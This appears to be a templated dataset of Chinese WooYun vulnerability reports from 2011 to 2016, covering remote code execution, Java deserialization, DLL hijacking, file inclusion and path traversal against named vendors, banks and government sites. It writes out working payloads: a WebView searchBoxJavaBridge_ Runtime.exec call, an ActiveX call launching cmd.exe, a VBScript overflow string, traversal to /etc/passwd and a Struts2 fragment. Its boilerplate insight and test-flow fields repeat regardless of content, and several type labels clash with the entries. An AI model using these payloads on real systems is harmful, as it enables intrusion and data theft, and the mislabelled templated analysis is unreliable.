**洞察**: 远程代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别远程代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 浏览器来说这种问题还是需要修补的导出searchBoxJavaBridge_好像是跟google的搜索框相关的。在android 4.0手机上测试实际存在，4.2以上版本不存在function execute(cmdArgs){return searchBoxJavaBridge_.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec(cmdArgs);}测试页面:https://example.com/[已脱敏]

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 需要把这个接口删除，调用removeJavascriptInterface方法https://example.com/[已脱敏]
---

---
### [wooyun-2015-0141866] 某视频网站视频PC客户端远程代码执行漏洞（附漏洞POC）
**厂商**: 某视频网站网 | **年份**: 2015 | **类型**: 远程代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 远程代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别远程代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 某视频网站视频PC客户端存在DLL劫持漏洞。当我们使用某视频网站视频打开一个视频时（比如Test.mp4），LeTVLoader.exe进程会尝试加载视频所在目录下的d3dcompiler_43.dll或者d3dcompiler_46.dll文件。如果将视频文件与恶意的DLL文件放在同一个目录下，打包发给受害者，受害者解压后打开视频就会中招。

**POC**: 首先，下载一个最新版本的某视频网站视频客户端（版本号为**.**.**.**），如下图所示：现在我们需要编译一个dll文件，代码如下（弹框提示证明DLL可以被加载）：#include <windows.h>BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason,LPVOID lpReserved ){switch( fdwReason ){case DLL_PROCESS_ATTACH:MessageBoxA(NULL,"DLL hijacking vulnerability detected.","Test",MB_ICONWARNING);b

**绕过**: 直接利用

**修复**: 在LeTVLoader.exe进程中调用SetDllDirectory("")，将当前DLL搜寻目录设置为空。
---

---
### [wooyun-2014-050971] 某支付钱包远程代码执行漏洞（需要一些步骤）
**厂商**: 某电商平台 | **年份**: 2014 | **类型**: 远程代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 远程代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别远程代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 某支付钱包远程代码执行漏洞，不过得点三个链接后才起作用，作为支付类app存在这种问题，还是不应该哦function execute(cmdArgs){return searchBoxJavaBridge_.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec(cmdArgs);}导出searchBoxJavaBridge_，是跟google的搜索框相关的。在android 4.2以上版本不存在。测试页面:https://example.com/[已脱敏]

**POC**: WebActivity没导出，但是外部链接没控制好，需要几步到恶意页面点余额宝的公众帐号进去后点88.taobao.com点击进入88.taobao.com后的页面的底下的官方博客，进入博客看到列表点击一条博文进去，里面点个评论，（评论可以自己去填一个url)，完了评论弄个乌云检测webview的url再点击下

**绕过**: 直接利用

**修复**: 调用removeJavascriptInterface方法删除掉searchBoxJavaBridge_
---

---
### [wooyun-2016-0168814] 某市政府采购网存在Java反序列化漏洞
**厂商**: cncert国家互联网应急中心 | **年份**: 2016 | **类型**: 系统/服务补丁不及时

**元思考**: 触发信号: 功能测试

**洞察**: 系统/服务补丁不及时防护不足，开发者信任前端输入

**测试流程**:
1. 识别系统/服务补丁不及时相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 1.某市政府采购网存在java反序列化漏洞，可沦陷服务器，执行任意命令2.地址：**.**.**.**/   http://**.**.**.**/3.漏洞详细过程检测得知服务器为Weblogic服务器，发现存在Java反序列化漏洞，然后执行三条命令如下

**POC**: 发现是root管理员用户，在查看一下服务器其他信息

**绕过**: 直接利用

**修复**: 升级打补丁、删除文件
---

---
### [wooyun-2013-038477] 全国范围天地图公共服务平台存在通用型远程代码执行漏洞
**厂商**: 国家测绘地理信息局 | **年份**: 2013 | **类型**: 远程代码执行

**元思考**: 触发信号: 认证接口

**洞察**: 远程代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别远程代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 网络实例https://example.com/[已脱敏]   上百了搜索特征baidu：天地图baidu：inurl：indexopen.action爬行目录assist    maintain   previewhttp报文主动巡检<div class="sub_nav_bg"><span class="sub_nav_icon sub_nav_font">&nbsp

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2016-0167607] 瀚蓝环境股份某处JAVA反序列化
**厂商**: 某环保公司 | **年份**: 2016 | **类型**: 系统/服务补丁不及时

**元思考**: 触发信号: 功能测试

**洞察**: 系统/服务补丁不及时防护不足，开发者信任前端输入

**测试流程**:
1. 识别系统/服务补丁不及时相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: **.**.**.**/

**POC**: 如上

**绕过**: 直接利用

**修复**: …………
---

---
### [wooyun-2015-0139662] 金山wps加载OLE对象之内存未初始化第一弹
**厂商**: 某软件厂商 | **年份**: 2015 | **类型**: 远程代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 远程代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别远程代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 申请内存,这是初始化之前的内存布局内存初始化后,可以看到,部分内存没有初始化,特别是esi+0x98的地方(画横线地方)(esi=图一的eax),还是刚申请内存的内容,而这里等于0x006e006f.然后稍后从这里取出虚函数表(esi=图一的eax),再call虚函数,导致crash.利用方法:利用heap feng shui技术布置wps的内存,然后控制未初始化的内存地方,也就是0x006e006f这里,在crash的地方就可以挟持eip.

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 参考微软做法,对加载的ole对象进行判断,不是ole对象的不加载.
---

---
### [wooyun-2015-0160352] 某运营商某省守护天使系统java反序列化漏洞root权限
**厂商**: 某运营商 | **年份**: 2015 | **类型**: 成功的入侵事件

**元思考**: 触发信号: 功能测试

**洞察**: 成功的入侵事件防护不足，开发者信任前端输入

**测试流程**:
1. 识别成功的入侵事件相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://**.**.**.**:7001

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2014-049937] UC浏览器HD版本远程代码执行漏洞
**厂商**: UC Mobile | **年份**: 2014 | **类型**: 远程代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 远程代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别远程代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 浏览器来说这种问题还是需要修补的导出searchBoxJavaBridge_好像是跟google的搜索框相关的。在android 4.0手机上测试实际存在，4.2以上版本不存在function execute(cmdArgs){return searchBoxJavaBridge_.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec(cmdArgs);}测试页面:https://example.com/[已脱敏]

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 需要把这个接口删除，调用removeJavascriptInterface方法https://example.com/[已脱敏]
---

---
### [wooyun-2016-0169030] 电信一处IDCS业务系统java反序列化
**厂商**: 北京电信 | **年份**: 2016 | **类型**: 

**元思考**: 触发信号: 功能测试

**洞察**: 防护不足，开发者信任前端输入

**测试流程**:
1. 识别相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: https://[IP已脱敏]

**POC**: 就是这么简单

**绕过**: 直接利用

**修复**: 内部自查，该怎么办怎么办吧
---

---
### [wooyun-2015-0115259] 迅雷看看组件全版本漏洞导致远程代码执行挂马
**厂商**: 迅雷 | **年份**: 2015 | **类型**: 远程代码执行

**元思考**: 触发信号: 参数注入

**洞察**: 远程代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别远程代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 本漏洞由ActiveX控件，DapCtrl.2.3.7201.447.(595).dll 组件引起测试环境：实测Win7/xp + ie8/9 (有些环境没测，应该是全版本通杀)+迅雷看看播放器最新版这个组件有很多漏洞，先挑最严重的一个说。有机会把其它的再补上。DapCtrl.DapCtrl控件的put方法有很多功能，其中一个是调用播放器播放网络视频。但由于限制不严格，造成了可以传入本地路径作为执行exe路径，参数也可以任意指定而不仅仅限于urlvar a = new ActiveXObject("DapCtrl.DapCtrl");  //调用控件a.put("SEXPLAYERS","C:\\windows\\system32\\cmd.exe"); // 要执行的文件a.put("SEXPLAY","/c notepad");  //参数

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 一般情况下也用不到这个功能，不如删了吧
---

---
### [wooyun-2015-0100274] 中国旅游新闻网存在远程代码执行漏洞
**厂商**: 中国旅游新闻网 | **年份**: 2015 | **类型**: 网络设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 网络设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别网络设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 我有神器,你耐我何！-.-小菜罢了！

**POC**: https://example.com/[已脱敏]

**绕过**: 直接利用

**修复**: 不清楚！
---

---
### [wooyun-2015-0164645] 某农商银行某系统va反序列化漏洞
**厂商**: cncert国家互联网应急中心 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: **.**.**.**:7011

**POC**: (见原文)

**绕过**: 直接利用

**修复**: buzhidao
---

---
### [wooyun-2015-0132922] 某保险公司某系统存在文件遍历
**厂商**: 某保险公司 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 参数注入

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 存在远程代码执行漏洞的网站：https://example.com/[已脱敏]  https://example.com/[已脱敏]   jinPengCarNo=1&mobile=987-65-4329&personName=ipebyqfg&proposalType=../../../../../../WEB-INF/config.xml?参数: proposalType通过知道proposalType的值可以远程执行命令的话，我在这里的话，就简单的测试证明漏洞的存在。其实，在tomcat里面，我们主要知道目录的存在的话，基本上把所有的配置都可以读出来。再证明一下：像服务器的配置文件我这里就不过多的陈述，其实都可以读出来配置的。这个网站还有一些跨站，你们自己去检测吧

**POC**: 同上

**绕过**: 直接利用

**修复**: 过滤
---

---
### [wooyun-2011-02197] 遨游浏览器远程代码执行漏洞
**厂商**: 傲游 | **年份**: 2011 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 遨游浏览器2会以绝对路径加载ieframe.dll，而IE6环境下无ieframe.dll，将ieframe.dll和HTML网页文件放同一个目录下，遨游浏览器打开网页后将会注入ieframe.dll。

**POC**: 测试环境: IE6+xp sp3以UNC路径浏览网页文件,如下图:

**绕过**: 直接利用

**修复**: loadlibary加载DLL的路径顺序:1. 程序路径2. system323. system4. windows5. 程序执行路径6. PATH环境变量使用相对路径导入库文件,就有可能导致DLL劫持漏洞.漏洞软件在无库文件的环境,以webdav等方式的UNC路径访问关联文件,漏洞软件走到第5条路
---

---
### [wooyun-2011-02751] 某城商银行网银控件存在缓冲区溢出漏洞
**厂商**: 某城商银行 | **年份**: 2011 | **类型**: 远程代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 远程代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别远程代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 网银控件包中的WebDllPersonal.dll是飞天诚信开发的用来支持usbkey的控件其中IsHaveInstalled函数存在缓冲区溢出漏洞Sub IsHaveInstalled (ByVal strProductName  As String)

**POC**: <object classid='clsid:6CF4C18B-D93D-4866-9A80-8E87AB491057' id='target' /></object><script language='vbscript'>arg1=String(4116, "A")target.IsHaveInstalled arg1</script></job></package>Exception Code: ACCESS_VIOLATIONDisasm: 7C809823	LOCK XADD [ECX],EAX	(KERNEL32.dll)Seh Chain:---------------------

**绕过**: 直接利用

**修复**: 限制变量长度
---

---
### [wooyun-2015-0144933] 某理财记账APPAndroid客户端用户数据明文存储在本地数据库可被远程窃取
**厂商**: 某金融科技公司 | **年份**: 2015 | **类型**: 远程代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 远程代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别远程代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 记账本记录信息、银行短信信息等数据明文存储在本地数据库文件中，由于客户端程序使用了webview组件，然而在Android小于等于4.3的系统版本的手机上存在webview漏洞，利用该漏洞可远程窃取应用本地数据文件。

**POC**: 记账本记录信息、银行短信等信息明文存储在本地的wacai365.so文件中：存储了记账本记录信息：存储了银行发来的短信信息（客户端程序专门对拦截到的短信进行过滤，收集银行发来的短信信息）：将手机连入burp设置的代理拦截客户端与服务端的通信，用webview漏洞检测代码替换服务端返回的html数据，此时客户端界面显示暴露的webview JS接口对象，该对象是系统暴露的接口：利用暴露的JS接口对象执行命令，读取本地的wacai365.so数据库文件，将POC代码替换服务端返回的html数据：此时客户端界面显示了读取的wacai365.so文件内容可将读取的内容发送到远程服务器。webview漏

**绕过**: 直接利用

**修复**: 对数据存储的数据加密后再存储。对于webview漏洞，可在代码中写入removeJavascriptInterface("searchBoxJavaBridge_")，webview漏洞详情参考：http://**.**.**.**/blog.htm?spm=**.**.**.**.UUt2Ay&i
---

---
### [wooyun-2016-0170571] 微软某PC端软件二进制代码劫持漏洞
**厂商**: 微软 | **年份**: 2016 | **类型**: 远程代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 远程代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别远程代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: Visual Studio Code Version 0.10.6存在DLL和EXE劫持漏洞。当使用Code打开文件（比如test.md）时，当前目录（current directory）为test.md所在目录。Code在启动时尝试运行REG.exe（reg query HKLM\Software\Microsoft\SQMClient /v MachineId），而且没有指定全路径，导致REG.exe可以从当前目录加载[1]。如果攻击者把test.md和reg.exe一起发给用户（比如做成压缩包），那么当用户打开test.md时，reg.exe也会执行。另外Code还加载了一些不存在的DLL：CSUNSAPI.dll, swift.dll, nfhwcrhk.dll, SureWareHook.dll, aep.dll, atasi.dll, nuronssl.dll, ubsec.d

**POC**: 打开Process Explorer，筛选Code.exe进程、NAME NOT FOUND结果，就可以发现这个漏洞：

**绕过**: 直接利用

**修复**: 使用全地址，调用SetDllDirectory("")，把当前地址设置为应用地址。
---

---
### [wooyun-2015-0104388] 某浏览器扫描二维码代码执行
**厂商**: 某互联网公司 | **年份**: 2015 | **类型**: 远程代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 远程代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别远程代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 用某浏览器扫描此二维码，自动跳转到某搜索引擎成功跳转

**POC**: 用某浏览器扫描此二维码，自动跳转到某搜索引擎成功跳转

**绕过**: 直接利用

**修复**: 应该把扫描结果用文本输出
---

---
### [wooyun-2016-0167773] 某市工商行政管理局java反序列化/发现大量木马
**厂商**: cncert国家互联网应急中心 | **年份**: 2016 | **类型**: 系统/服务补丁不及时

**元思考**: 触发信号: 后台管理

**洞察**: 系统/服务补丁不及时防护不足，开发者信任前端输入

**测试流程**:
1. 识别系统/服务补丁不及时相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 加固了后台，但是却存在java反序列化漏洞框住的大多都是木马

**POC**: 加固了后台，但是却存在java反序列化漏洞框住的大多都是木马

**绕过**: 直接利用

**修复**: 修复
---

---
### [wooyun-2014-064607] 某航空集团某站任意代码执行
**厂商**: 某航空集团 | **年份**: 2014 | **类型**: 系统/服务补丁不及时

**元思考**: 触发信号: 功能测试

**洞察**: 系统/服务补丁不及时防护不足，开发者信任前端输入

**测试流程**:
1. 识别系统/服务补丁不及时相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 某航空集团某站任意代码执行

**POC**: 国航某功能使用了ST2:https://example.com/[已脱敏]'-an'}).start().getInputStream())).readLine()}任意代码执行：

**绕过**: 直接利用

**修复**: 升级struts2
---

---
### [wooyun-2015-0126273] 机锋网主站远程文件包含漏洞（任意代码执行）
**厂商**: 机锋网 | **年份**: 2015 | **类型**: 文件包含

**元思考**: 触发信号: 参数注入

**洞察**: 文件包含防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件包含相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: https://example.com/[已脱敏]

**POC**: (见原文)

**绕过**: 直接利用

**修复**: allow_url_include
---

---
### [wooyun-2011-02515] Ecmall全版本本地文件包含漏洞
**厂商**: ShopEx | **年份**: 2011 | **类型**: 文件包含

**元思考**: 触发信号: 功能测试

**洞察**: 文件包含防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件包含相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: eccore/ecmall.php内if (!get_magic_quotes_gpc()){$_GET   = addslashes_deep($_GET);$_POST  = addslashes_deep($_POST);$_COOKIE= addslashes_deep($_COOKIE);}/* 请求转发 */$default_app = $config['default_app'] ? $config['default_app'] : 'default';$default_act = $config['default_act'] ? $config['default_act'] : 'index';$app    = isset($_REQUEST['app']) ? trim($_REQUEST['app']) : $default_app;$act    = isset($

**POC**: wooyun.org/index.php?app=../../../../../../../../../proc/self/environ%00wooyun.org

**绕过**: 直接利用

**修复**: 不需要啊不需要
---

---
### [wooyun-2016-0168109] 某省工伤备案管理信息系统java反序列化漏洞
**厂商**: cncert国家互联网应急中心 | **年份**: 2016 | **类型**: 系统/服务补丁不及时

**元思考**: 触发信号: 功能测试

**洞察**: 系统/服务补丁不及时防护不足，开发者信任前端输入

**测试流程**:
1. 识别系统/服务补丁不及时相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: **.**.**.**:7001/WebContent/

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 打补丁
---

---
### [wooyun-2014-085724] 某运营商某平台补丁不及时致任意代码执行
**厂商**: 某运营商 | **年份**: 2014 | **类型**: 系统/服务补丁不及时

**元思考**: 触发信号: 功能测试

**洞察**: 系统/服务补丁不及时防护不足，开发者信任前端输入

**测试流程**:
1. 识别系统/服务补丁不及时相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 地址：http://[IP已脱敏]

**POC**: struts漏洞存在，未打补丁，无防火墙拦截电信平台，不再继续深入，尽快修复

**绕过**: 直接利用

**修复**: 打补丁
---

---
### [wooyun-2012-08133] 中国民航分站远程代码执行漏洞
**厂商**: 中国民航总局 | **年份**: 2012 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 中国民航分站远程代码执行漏洞俺胆小，没有进一步测试还是发图吧

**POC**: https://example.com/[已脱敏]).pdf&destfilename=../../../../../../../../etc/passwd

**绕过**: 直接利用

**修复**: 不关我的事 我神马都没看到
---
